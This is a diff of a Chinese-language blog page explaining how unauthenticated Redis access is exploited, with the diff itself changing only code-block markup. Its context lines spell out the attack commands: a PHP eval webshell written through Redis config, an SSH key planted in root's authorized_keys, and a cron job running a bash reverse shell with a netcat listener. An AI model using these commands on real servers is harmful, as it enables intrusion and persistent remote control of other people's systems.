@@ -50,9 +50,8 @@
   <li>redis安全配置</li>
 </ol>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>测试环境 CentOS 6.5 x64
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>测试环境 CentOS 6.5 x64
+</code></pre></div></div>
 
 <p><strong>未授权访问</strong></p>
 
@@ -74,7 +73,7 @@
 
 <p>redis-cli -h 10.211.55.10</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>config set dir /var/www/html/
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config set dir /var/www/html/
 
 set shell &lt;?php eval($_REQUEST[\'syclover\'])?&gt;
 
@@ -83,8 +82,7 @@ config set dbfilename syclover.php
 save
 
 exit
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>存在的问题,如果redis里面的数据量特别大并且前面存在&lt;?php 之类的符号</p>
 
 <p>先通过randomkey来查看键值之间的规律，然后可以将数据库备份下来，找到包含&lt;?php 的键名，通过 keys *str*找到真正的键名，然后去修改这个键名。因为数据量很大所以备份的shell也很大，然后在生成shell的时候，可以设置不超时，并且在生成完成之后就退出。</p>
@@ -93,40 +91,35 @@ exit
 
 <p><strong>获取root</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>victim server CentOS6.6+redis2.4  192.168.192.133
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>victim server CentOS6.6+redis2.4  192.168.192.133
 
 attack server CentOS6.6  192.168.192.132
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>先在attack server生成一个公钥</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code> ssh-keygen -t rsa -C "redis"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssh-keygen -t rsa -C "redis"
 (echo -e "\n\n"; cat redis.pub; echo -e "\n\n") &gt; redis.txt
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>然后执行</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>redis-cli -h 192.168.192.133 flushall
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis-cli -h 192.168.192.133 flushall
 
 cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
 
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>登录redis  redis-cli -h 192.168.192.133</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>CONFIG set dir /root/.ssh/
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CONFIG set dir /root/.ssh/
 config set dbfilename "authorized_keys"
 save
 exit
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>然后就可以使用ssh的私钥登录了</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ssh -i redis.pub root@192.168.192.133
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i redis.pub root@192.168.192.133
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2436203329.png" alt="2436203329" /></p>
 
@@ -142,7 +135,7 @@ exit
 
 <p>redis+crontab</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>redis-cli config set dir /var/spool/cron/
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis-cli config set dir /var/spool/cron/
 
 redis-cli config set dbfilename root
 
@@ -151,8 +144,7 @@ echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/8443 0&gt;&amp;1 \
 redis-cli save
 
 nc -lvv 8443
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <hr />
 
